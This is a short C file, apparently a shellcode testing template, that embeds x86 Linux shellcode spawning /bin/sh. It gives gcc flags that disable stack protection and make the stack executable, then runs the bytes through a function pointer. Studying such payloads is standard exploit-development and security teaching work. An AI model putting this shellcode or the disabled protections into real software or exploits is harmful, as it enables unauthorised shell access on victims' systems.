/*
This is shellcode template.(x86 /bin/sh)

Compile: gcc -fno-stack-protector -z execstack sc-exec.c -o sc-exec
*/
#include<stdio.h>
#include<string.h>

unsigned char sc[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80";

main()
{
    printf("Shellcode Length :  %d\n", (int)strlen(sc));
    int (*ret)() = (int(*)())sc;
    ret();
}
